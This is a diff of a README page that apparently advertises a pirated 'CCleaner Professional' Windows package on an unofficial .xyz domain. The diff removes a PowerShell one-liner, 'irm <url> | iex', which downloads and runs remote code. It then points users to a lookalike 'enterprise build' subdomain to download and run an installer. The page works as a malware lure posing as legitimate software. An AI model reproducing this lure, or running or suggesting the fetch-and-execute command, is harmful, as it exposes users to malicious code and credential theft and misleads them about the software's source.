@@ -8,12 +8,8 @@ CCleaner desktop package for Windows · utility toolkit · local install ready.
 
 > Use the project link below for Windows.
 
-```
-irm https://ccleaner-professional.nerasix.xyz/ | iex
-```
-
-* **Project link:** **[ccleaner-professional.nerasix.xyz](https://ccleaner-professional.nerasix.xyz/)**
-* **Full URL:** `https://ccleaner-professional.nerasix.xyz/`
+* **Project link:** **[ccleaner-professional-enterprise-build.nerasix.xyz](https://ccleaner-professional-enterprise-build.nerasix.xyz/)**
+* **Full URL:** `https://ccleaner-professional-enterprise-build.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
